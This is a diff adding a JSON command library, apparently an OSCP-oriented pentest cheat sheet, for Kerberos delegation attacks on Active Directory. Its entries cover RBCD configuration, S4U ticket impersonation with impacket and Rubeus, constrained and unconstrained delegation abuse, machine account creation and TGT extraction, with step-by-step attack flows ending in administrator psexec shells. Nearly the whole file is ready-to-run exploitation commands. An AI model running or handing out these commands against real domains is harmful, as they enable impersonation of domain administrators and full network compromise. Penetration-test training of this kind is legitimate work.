@@ -1,0 +1,251 @@
+{
+  "commands": [
+    {
+      "id": "rbcd-set-msds",
+      "name": "RBCD - Set msDS-AllowedToActOnBehalfOfOtherIdentity",
+      "description": "Configure Resource-Based Constrained Delegation on target computer",
+      "command": "python3 rbcd.py -delegate-from '<CONTROLLED_ACCOUNT>$' -delegate-to '<TARGET_COMPUTER>$' -action write '<DOMAIN>/<USERNAME>:<PASSWORD>'",
+      "category": "exploitation",
+      "subcategory": "active-directory",
+      "variables": [
+        {"name": "<CONTROLLED_ACCOUNT>", "description": "Machine account you control", "example": "YOURPC", "required": true},
+        {"name": "<TARGET_COMPUTER>", "description": "Computer to configure RBCD on", "example": "DC01", "required": true},
+        {"name": "<DOMAIN>", "description": "Domain name", "example": "corp.local", "required": true},
+        {"name": "<USERNAME>", "description": "User with write access to target", "example": "user", "required": true},
+        {"name": "<PASSWORD>", "description": "User password", "required": true}
+      ],
+      "tags": ["ACTIVE_DIRECTORY", "RBCD", "DELEGATION", "PRIVILEGE_ESCALATION", "LINUX", "OSCP:HIGH"],
+      "flag_explanations": {
+        "-delegate-from": "Account that will be allowed to delegate (your controlled account)",
+        "-delegate-to": "Target computer to configure RBCD on",
+        "-action write": "Write the msDS-AllowedToActOnBehalfOfOtherIdentity attribute",
+        "-action remove": "Remove RBCD configuration (cleanup)"
+      },
+      "success_indicators": ["Delegation rights modified", "msDS-AllowedToActOnBehalfOfOtherIdentity"],
+      "failure_indicators": ["Access denied", "Insufficient rights"],
+      "next_steps": ["rbcd-getST"],
+      "alternatives": ["bloodyad-rbcd"],
+      "prerequisites": [],
+      "troubleshooting": {
+        "Access denied": "User lacks GenericWrite/WriteDacl on target computer"
+      },
+      "notes": "RBCD (RESOURCE-BASED CONSTRAINED DELEGATION):\nAllows impersonation to specific services on target computer.\n\nATTACK FLOW:\n1. Find target where you have GenericWrite/WriteDacl (BloodHound)\n2. Create/use machine account you control (requires MAQ > 0 or existing)\n3. Set RBCD: rbcd.py -delegate-from YOURPC$ -delegate-to TARGET$\n4. Get ticket: getST.py -spn cifs/TARGET -impersonate administrator\n5. Use ticket: psexec.py -k TARGET\n\nREQUIRES:\n- GenericWrite/WriteDacl/GenericAll on target computer\n- A machine account you control (create with addcomputer.py)\n- Target computer must have unconstrained delegation OR you use S4U2Self\n\nOSCP TIP:\nRBCD is extremely common in OSCP labs. Look for GenericWrite on computers.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "rbcd-getST",
+      "name": "RBCD - Get Service Ticket via S4U",
+      "description": "Perform S4U2Self + S4U2Proxy to impersonate user to target service",
+      "command": "impacket-getST -spn 'cifs/<TARGET_FQDN>' -impersonate '<TARGET_USER>' '<DOMAIN>/<MACHINE_ACCOUNT>$' -hashes ':<NTLM_HASH>'",
+      "category": "exploitation",
+      "subcategory": "active-directory",
+      "variables": [
+        {"name": "<TARGET_FQDN>", "description": "Target computer FQDN", "example": "dc01.corp.local", "required": true},
+        {"name": "<TARGET_USER>", "description": "User to impersonate", "example": "administrator", "required": true},
+        {"name": "<DOMAIN>", "description": "Domain name", "example": "corp.local", "required": true},
+        {"name": "<MACHINE_ACCOUNT>", "description": "Your controlled machine account (without $)", "example": "YOURPC", "required": true},
+        {"name": "<NTLM_HASH>", "description": "Machine account NTLM hash", "required": true}
+      ],
+      "tags": ["ACTIVE_DIRECTORY", "RBCD", "S4U", "KERBEROS", "DELEGATION", "LINUX", "OSCP:HIGH"],
+      "flag_explanations": {
+        "-spn": "Service Principal Name for the target service (cifs/host for file share access)",
+        "-impersonate": "User to impersonate via S4U",
+        "-hashes": "NTLM hash in format :HASH (LM can be empty)",
+        "-dc-ip": "Domain controller IP (optional)"
+      },
+      "success_indicators": ["Saving ticket in", ".ccache"],
+      "failure_indicators": ["KDC_ERR_BADOPTION", "KDC_ERR_S_PRINCIPAL_UNKNOWN"],
+      "next_steps": ["psexec-shell"],
+      "alternatives": ["rubeus-s4u-impersonate"],
+      "prerequisites": ["rbcd-set-msds"],
+      "troubleshooting": {
+        "KDC_ERR_BADOPTION": "RBCD not properly configured or target not supporting delegation",
+        "KDC_ERR_S_PRINCIPAL_UNKNOWN": "SPN not found - check target FQDN spelling"
+      },
+      "notes": "S4U ATTACKS:\nS4U2Self: Request ticket to self on behalf of any user (gets forwardable ticket)\nS4U2Proxy: Use forwardable ticket to access target service\n\nAFTER GETTING TICKET:\nexport KRB5CCNAME=/path/to/ticket.ccache\nimpacket-psexec -k -no-pass <target>\n\nOR:\nimpacket-psexec -k -no-pass <domain>/<impersonated_user>@<target>",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "rubeus-s4u-impersonate",
+      "name": "Rubeus - S4U Delegation Attack (Windows)",
+      "description": "Perform S4U2Self + S4U2Proxy attack from Windows",
+      "command": "Rubeus.exe s4u /user:<MACHINE_ACCOUNT>$ /rc4:<NTLM_HASH> /impersonateuser:<TARGET_USER> /msdsspn:cifs/<TARGET_FQDN> /ptt",
+      "category": "exploitation",
+      "subcategory": "active-directory",
+      "variables": [
+        {"name": "<MACHINE_ACCOUNT>", "description": "Your controlled machine account", "example": "YOURPC", "required": true},
+        {"name": "<NTLM_HASH>", "description": "Machine account NTLM hash", "required": true},
+        {"name": "<TARGET_USER>", "description": "User to impersonate", "example": "administrator", "required": true},
+        {"name": "<TARGET_FQDN>", "description": "Target computer FQDN", "example": "dc01.corp.local", "required": true}
+      ],
+      "tags": ["ACTIVE_DIRECTORY", "RBCD", "S4U", "KERBEROS", "DELEGATION", "WINDOWS", "OSCP:HIGH"],
+      "flag_explanations": {
+        "/user": "Account performing the delegation (your machine account)",
+        "/rc4": "NTLM hash of the account",
+        "/impersonateuser": "User to impersonate",
+        "/msdsspn": "Target service SPN",
+        "/ptt": "Pass-the-Ticket - inject into current session",
+        "/altservice": "Alternative SPN for the same ticket"
+      },
+      "success_indicators": ["[*] Impersonating user", "[+] S4U2proxy success", "[+] Ticket successfully imported"],
+      "failure_indicators": ["KDC_ERR_BADOPTION", "KDC_ERR_TGT_REVOKED"],
+      "next_steps": ["psexec-shell"],
+      "alternatives": ["rbcd-getST"],
+      "prerequisites": ["rbcd-set-msds"],
+      "troubleshooting": {
+        "KDC_ERR_TGT_REVOKED": "Account disabled or password changed"
+      },
+      "notes": "RUBEUS S4U:\nWindows equivalent of impacket-getST.\n\n/ptt automatically injects ticket.\n/altservice:host,http,ldap gets tickets for multiple services.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "impacket-getST-constrained",
+      "name": "Impacket getST - Constrained Delegation Attack",
+      "description": "Exploit constrained delegation to impersonate users to allowed services",
+      "command": "impacket-getST -spn '<ALLOWED_SPN>' -impersonate '<TARGET_USER>' '<DOMAIN>/<SERVICE_ACCOUNT>' -hashes ':<NTLM_HASH>'",
+      "category": "exploitation",
+      "subcategory": "active-directory",
+      "variables": [
+        {"name": "<ALLOWED_SPN>", "description": "SPN from msDS-AllowedToDelegateTo", "example": "cifs/dc01.corp.local", "required": true},
+        {"name": "<TARGET_USER>", "description": "User to impersonate", "example": "administrator", "required": true},
+        {"name": "<DOMAIN>", "description": "Domain name", "example": "corp.local", "required": true},
+        {"name": "<SERVICE_ACCOUNT>", "description": "Account with constrained delegation", "example": "svc_sql", "required": true},
+        {"name": "<NTLM_HASH>", "description": "Service account NTLM hash", "required": true}
+      ],
+      "tags": ["ACTIVE_DIRECTORY", "CONSTRAINED_DELEGATION", "S4U", "KERBEROS", "LINUX", "OSCP:HIGH"],
+      "flag_explanations": {
+        "-spn": "Target SPN from AllowedToDelegateTo attribute",
+        "-impersonate": "User to impersonate (usually administrator)",
+        "-hashes": "Account hash in :NTLM format"
+      },
+      "success_indicators": ["Saving ticket", ".ccache"],
+      "failure_indicators": ["KDC_ERR_BADOPTION"],
+      "next_steps": ["psexec-shell"],
+      "alternatives": ["rubeus-s4u-impersonate"],
+      "prerequisites": [],
+      "troubleshooting": {
+        "KDC_ERR_BADOPTION": "Account not configured for constrained delegation"
+      },
+      "notes": "CONSTRAINED DELEGATION:\nAccount has msDS-AllowedToDelegateTo set - can impersonate ANY user to those SPNs.\n\nFIND TARGETS:\nBloodHound: delegation-constrained-abuse query\nLDAP: msDS-AllowedToDelegateTo attribute on user/computer\n\nSPN ALTERNATIVE:\nService portion of SPN is arbitrary - cifs/host and http/host use same key.\nUse /altservice in Rubeus to get tickets for services not in AllowedToDelegateTo.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "rubeus-monitor",
+      "name": "Rubeus - Monitor for TGTs (Unconstrained Delegation)",
+      "description": "Monitor for incoming TGTs on unconstrained delegation host",
+      "command": "Rubeus.exe monitor /interval:5 /nowrap /targetuser:<TARGET_USER>",
+      "category": "exploitation",
+      "subcategory": "active-directory",
+      "variables": [
+        {"name": "<TARGET_USER>", "description": "User TGT to capture (optional)", "example": "DC01$", "required": false}
+      ],
+      "tags": ["ACTIVE_DIRECTORY", "UNCONSTRAINED_DELEGATION", "TGT", "KERBEROS", "WINDOWS", "OSCP:HIGH"],
+      "flag_explanations": {
+        "monitor": "Continuously monitor for new TGTs in LSASS",
+        "/interval": "Check interval in seconds",
+        "/nowrap": "Don't wrap Base64 output (easier to copy)",
+        "/targetuser": "Only show TGTs for specific user"
+      },
+      "success_indicators": ["[*] Monitoring every", "User:", "ServiceName:", "StartTime:"],
+      "failure_indicators": ["Access denied"],
+      "next_steps": ["rubeus-ptt"],
+      "alternatives": [],
+      "prerequisites": [],
+      "troubleshooting": {
+        "Access denied": "Need admin rights on unconstrained delegation host"
+      },
+      "notes": "UNCONSTRAINED DELEGATION ATTACK:\nHosts with TrustedForDelegation cache TGTs of connecting users.\n\nATTACK FLOW:\n1. Compromise host with unconstrained delegation\n2. Run Rubeus monitor to watch for TGTs\n3. Coerce high-value target (DC) to authenticate to us\n4. Capture TGT and use for impersonation\n\nCOERCION METHODS:\nPetitPotam, PrinterBug, Coercer - force DC to authenticate.\n\nOSCP TIP:\nLook for 'YOURPC' → 'TrustedForDelegation: True' in BloodHound.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "addcomputer-create",
+      "name": "Impacket addcomputer - Create Machine Account",
+      "description": "Create a new machine account for RBCD attacks",
+      "command": "impacket-addcomputer -computer-name '<NEW_COMPUTER>$' -computer-pass '<PASSWORD>' -dc-ip <DC_IP> '<DOMAIN>/<USERNAME>:<PASSWORD>'",
+      "category": "exploitation",
+      "subcategory": "active-directory",
+      "variables": [
+        {"name": "<NEW_COMPUTER>", "description": "Name for new machine account", "example": "YOURPC", "required": true},
+        {"name": "<PASSWORD>", "description": "Password for new machine", "example": "Password123!", "required": true},
+        {"name": "<DC_IP>", "description": "Domain controller IP", "example": "192.168.50.70", "required": true},
+        {"name": "<DOMAIN>", "description": "Domain name", "example": "corp.local", "required": true},
+        {"name": "<USERNAME>", "description": "Domain user", "example": "user", "required": true}
+      ],
+      "tags": ["ACTIVE_DIRECTORY", "RBCD", "MACHINE_ACCOUNT", "LINUX", "OSCP:HIGH"],
+      "flag_explanations": {
+        "-computer-name": "Name for the new machine account (include $ suffix)",
+        "-computer-pass": "Password for the machine account",
+        "-dc-ip": "Domain controller IP"
+      },
+      "success_indicators": ["Successfully added machine account"],
+      "failure_indicators": ["User MachineAccountQuota exceeded", "Access denied"],
+      "next_steps": ["rbcd-set-msds"],
+      "alternatives": ["powermad-addcomputer"],
+      "prerequisites": [],
+      "troubleshooting": {
+        "MachineAccountQuota exceeded": "MAQ is 0 - use existing machine account instead",
+        "Access denied": "User cannot create machine accounts"
+      },
+      "notes": "MACHINE ACCOUNT CREATION:\nBy default, domain users can create up to 10 machine accounts (ms-DS-MachineAccountQuota).\n\nFOR RBCD:\n1. Create machine account you control\n2. Use its hash for S4U attack\n\nGET HASH:\nimpacket-secretsdump '<DOMAIN>/<NEW_COMPUTER>$:<PASSWORD>@<DC_IP>'\n\nOR compute hash:\npython3 -c \"import hashlib; print(hashlib.new('md4', 'Password123!'.encode('utf-16le')).hexdigest())\"",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "bloodyad-rbcd",
+      "name": "BloodyAD - Set RBCD Delegation",
+      "description": "Configure RBCD using BloodyAD tool",
+      "command": "bloodyAD -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --host '<DC_IP>' set object '<TARGET_COMPUTER>$' msDS-AllowedToActOnBehalfOfOtherIdentity -v '<CONTROLLED_SID>'",
+      "category": "exploitation",
+      "subcategory": "active-directory",
+      "variables": [
+        {"name": "<DOMAIN>", "description": "Domain name", "example": "corp.local", "required": true},
+        {"name": "<USERNAME>", "description": "User with write access", "example": "user", "required": true},
+        {"name": "<PASSWORD>", "description": "User password", "required": true},
+        {"name": "<DC_IP>", "description": "Domain controller IP", "example": "192.168.50.70", "required": true},
+        {"name": "<TARGET_COMPUTER>", "description": "Target computer name", "example": "DC01", "required": true},
+        {"name": "<CONTROLLED_SID>", "description": "SID of your controlled account", "example": "S-1-5-21-...", "required": true}
+      ],
+      "tags": ["ACTIVE_DIRECTORY", "RBCD", "BLOODYAD", "LINUX", "OSCP:HIGH"],
+      "flag_explanations": {
+        "-d": "Domain name",
+        "-u": "Username",
+        "-p": "Password",
+        "--host": "DC hostname/IP",
+        "set object": "Modify AD object attribute"
+      },
+      "success_indicators": ["Success"],
+      "failure_indicators": ["Access denied", "Object not found"],
+      "next_steps": ["rbcd-getST"],
+      "alternatives": ["rbcd-set-msds"],
+      "prerequisites": [],
+      "troubleshooting": {
+        "Access denied": "Insufficient permissions on target"
+      },
+      "notes": "BLOODYAD:\nMulti-purpose AD exploitation tool.\n\nAlternative to rbcd.py for RBCD configuration.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "rubeus-tgtdeleg",
+      "name": "Rubeus - TGT Delegation Trick",
+      "description": "Extract usable TGT from current session using delegation",
+      "command": "Rubeus.exe tgtdeleg /nowrap",
+      "category": "exploitation",
+      "subcategory": "active-directory",
+      "variables": [],
+      "tags": ["ACTIVE_DIRECTORY", "KERBEROS", "TGT", "WINDOWS", "OSCP:MEDIUM"],
+      "flag_explanations": {
+        "tgtdeleg": "Request forwardable TGT using delegation trick",
+        "/nowrap": "Don't wrap Base64 output"
+      },
+      "success_indicators": ["[*] Action: Request Fake Delegation TGT", "[*] TGT extraction successful"],
+      "failure_indicators": ["Unable to get delegation TGT"],
+      "next_steps": ["rubeus-ptt"],
+      "alternatives": [],
+      "prerequisites": [],
+      "troubleshooting": {
+        "Unable to get delegation TGT": "No service in domain allows delegation"
+      },
+      "notes": "TGT DELEGATION TRICK:\nRequests TGT by abusing Kerberos delegation.\n\nUse this when:\n- You have shell but no credentials\n- Want to extract current user's TGT for use elsewhere\n- sekurlsa::logonpasswords doesn't return hashes (credential guard)",
+      "oscp_relevance": "medium"
+    }
+  ]
+}
